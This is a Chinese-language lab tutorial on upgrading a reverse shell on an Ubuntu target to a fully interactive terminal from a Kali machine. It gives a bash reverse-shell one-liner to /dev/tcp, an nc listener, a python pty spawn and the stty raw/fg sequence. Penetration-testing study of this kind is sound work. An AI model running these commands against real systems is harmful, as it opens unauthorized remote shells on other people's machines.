# 反弹Shell升级为交互式Shell


<meta name="referrer" content="no-referrer" />

## 前言

看hack the box的视频的时候，发现ippsec不喜欢用蚁剑，喜欢弹个shell回来。

然后一顿操作把一个简单的shell就升级到了一个标准交互式shell

写这篇文章记录一下

## 正文

攻击机：kali

靶机：ubuntu

首先ubuntu建一个新用户：test，密码 test

### 普通Shell

给kali弹shell

```
bash -i >& /dev/tcp/192.168.145.128/4444 0>&1
```

kali

```
nc -lvvp 4444
```

然后发现这个shell有很多问题

- 无法使用vim等文本编辑器
- 不能补全

- 不能su
- 没有向上箭头使用历史
  等等

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900415519-955fe1ca-abbd-4956-bd34-6fd9ebc817f3.png)

### 半交互式Shell

对于已经安装了python的系统，我们可以使用python提供的pty模块，只需要一行脚本就可以创建一个原生的终端，命令如下：

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

在创建完成后，我们此时就可以运行su命令了

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900415634-b4a6424c-a7f9-4bd8-89b0-ace82c85219b.png)

但是还是存在很多问题

- 无法使用vim等文本编辑器
- 不能补全

- 没有向上箭头使用历史

### 完全交互式Shell

命令：

```
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z
$ stty raw -echo
$ fg
$ reset
$ export SHELL=bash
//$ export TERM=xterm-256color
```

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900415738-035aea7f-ff0e-4ebb-a242-ac5d30bcc342.png)

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900415888-bec6cccf-6a6f-4ce9-b303-7242a6a7c5eb.png)

此时已经拥有了一个完全交互式Shell，就可以使用上下左右，vi，tab补全等等一系列操作，并且按Ctrl-c也不会退出。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900416037-96347a6a-f11e-4de6-8a18-e7a5139b92e1.png)

### 相关命令解析

```
stty -echo #禁止回显，当在键盘上输入时，并不出现在屏幕上
stty echo #打开回显
stty raw #设置原始输入
stty -raw #关闭原始输入
bg
将一个在后台暂停的命令，变成继续执行
fg
将后台中的命令调至前台继续运行
jobs
查看当前有多少在后台运行的命令
ctrl + z
可以将一个正在前台执行的命令放到后台，并且暂停
clear
这个命令将会刷新屏幕，本质上只是让终端显示页向后翻了一页，如果向上滚动屏幕还可以看到之前的操作信息。
 
reset
这个命令将完全刷新终端屏幕，之前的终端输入操作信息将都会被清空
```

## 参考链接

[https://www.freebuf.com/news/142195.html](https:_www.freebuf.com_news_142195)
